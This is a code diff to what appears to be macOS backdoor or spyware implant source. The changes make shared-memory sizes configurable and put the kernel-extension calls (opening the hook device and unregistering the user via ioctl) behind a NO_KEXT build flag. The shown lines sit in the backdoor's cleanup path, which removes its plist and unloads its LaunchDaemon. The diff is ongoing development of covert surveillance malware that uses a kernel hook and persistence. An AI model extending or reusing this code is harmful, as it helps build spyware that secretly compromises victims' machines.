@@ -119,13 +119,13 @@ static NSLock *gSyncLock                  = nil;
               key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
               
               gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-                                                                      size: SHMEM_COMMAND_MAX_SIZE
+                                                                      size: gMemCommandMaxSize
                                                              semaphoreName: SHMEM_SEM_NAME];
               [gSharedMemoryCommand createMemoryRegion];
               [gSharedMemoryCommand attachToMemoryRegion];
               
               gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                                      size: SHMEM_LOG_MAX_SIZE
+                                                                      size: gMemLogMaxSize
                                                              semaphoreName: SHMEM_SEM_NAME];
               [gSharedMemoryLogging createMemoryRegion];
               [gSharedMemoryLogging attachToMemoryRegion];
@@ -424,10 +424,12 @@ static NSLock *gSyncLock                  = nil;
           
           [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
                                                      error: nil];
-          
+  
+          int activeBackdoors = 1;
+  
+#ifndef NO_KEXT
           int kextFD  = open(BDOR_DEVICE, O_RDWR);
           int ret     = 0;
-          int activeBackdoors = 1;
           
           //
           // Get the number of active backdoors since we won't remove the
@@ -437,7 +439,7 @@ static NSLock *gSyncLock                  = nil;
           
           const char *userName = [NSUserName() UTF8String];
           ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
-          
+#endif
           sleep(1);
           
           // Just ourselves
@@ -527,8 +529,9 @@ static NSLock *gSyncLock                  = nil;
           infoLog(@"Unregistering uspace components");
 #endif
 
+#ifndef NO_KEXT
           close(kextFD);
-          
+#endif
           //
           // Unload our service from LaunchDaemon
           //
